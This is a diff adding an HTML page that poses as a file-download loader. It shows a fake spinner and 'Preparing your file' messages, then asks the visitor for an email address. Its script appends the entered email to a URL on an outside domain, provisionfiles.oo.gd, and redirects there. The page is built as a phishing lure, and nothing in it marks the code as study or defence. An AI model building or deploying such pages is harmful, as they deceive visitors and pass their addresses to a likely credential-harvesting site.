@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Loading Experience</title>
+<style>
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #0f172a;
+  color: white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+}
+.container {
+  text-align: center;
+}
+.spinner {
+  width: 50px;
+  height: 50px;
+  border: 5px solid #ccc;
+  border-top: 5px solid #3b82f6;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 20px auto;
+}
+@keyframes spin {
+  100% { transform: rotate(360deg); }
+}
+.hidden {
+  display: none;
+}
+input {
+  padding: 10px;
+  width: 250px;
+  margin-top: 15px;
+  border-radius: 5px;
+  border: none;
+}
+button {
+  padding: 10px 20px;
+  margin-top: 10px;
+  background: #3b82f6;
+  border: none;
+  color: white;
+  border-radius: 5px;
+  cursor: pointer;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h2>Please wait...</h2>
+  <div class="spinner" id="spinner"></div>
+  <div id="status">Initializing...</div>
+
+  <div id="formBox" class="hidden">
+    <h3>Enter your email</h3>
+    <input type="email" id="email" placeholder="you@example.com" />
+    <br>
+    <button onclick="submitEmail()">Continue</button>
+  </div>
+</div>
+
+<script>
+const status = document.getElementById("status");
+const spinner = document.getElementById("spinner");
+const formBox = document.getElementById("formBox");
+
+setTimeout(() => status.textContent = "Loading...", 1500);
+setTimeout(() => status.textContent = "Preparing your file...", 3000);
+setTimeout(() => status.textContent = "Almost ready...", 4500);
+setTimeout(() => status.textContent = "Done!", 6000);
+
+setTimeout(() => {
+  spinner.style.display = "none";
+  status.style.display = "none";
+  formBox.classList.remove("hidden");
+}, 7500);
+
+function submitEmail() {
+  const email = document.getElementById("email").value;
+
+  if (!email) {
+    alert("Please enter an email");
+    return;
+  }
+
+  // Proper way: pass email as a query parameter
+  const encodedEmail = encodeURIComponent(email);
+
+  // Replace with your real site later
+  window.location.href = "https://www.provisionfiles.oo.gd/8939/#" + encodedEmail;
+}
+</script>
+
+</body>
+</html>
